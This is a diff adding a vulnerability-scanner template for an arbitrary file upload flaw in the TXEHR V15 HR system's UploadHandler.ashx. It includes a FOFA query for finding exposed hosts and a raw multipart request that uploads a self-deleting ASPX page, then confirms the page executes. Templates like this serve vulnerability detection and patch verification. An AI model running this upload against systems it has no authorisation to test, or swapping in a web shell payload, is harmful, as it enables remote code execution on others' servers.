@@ -1,0 +1,47 @@
+id: tongxiangHR-TXEHR_V15_UploadHandler-File-upload
+
+info:
+  name: 同享人力资源管理系统-TXEHR V15 UploadHandler.ashx 任意文件上传
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" 
+  
+http:
+  - raw:
+      - |
+        POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+
+        -----------------------------142851345723692939351758052805
+        Content-Disposition: form-data; name="Filedata"; filename="{{username}}.aspx"
+        Content-Type: text/plain
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        -----------------------------142851345723692939351758052805--
+      
+      - |
+        GET /Handler/Uploadfile2/{{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
